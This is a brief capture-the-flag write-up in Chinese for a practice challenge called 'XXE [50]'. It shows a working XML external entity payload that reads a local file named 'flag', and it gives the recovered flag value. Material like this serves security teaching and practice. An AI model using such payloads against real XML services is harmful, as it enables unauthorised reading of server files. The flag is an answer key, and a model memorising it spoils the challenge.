# XXE [50]

XXE 攻擊練習。SYSTEM 會讀內部檔案，下列構造可以得知檔案內容。

```
<!DOCTYPE kaibro[
  <!ENTITY xxe SYSTEM "flag">
]>
<root>&xxe;</root>
```

`FLAG{XXE}`
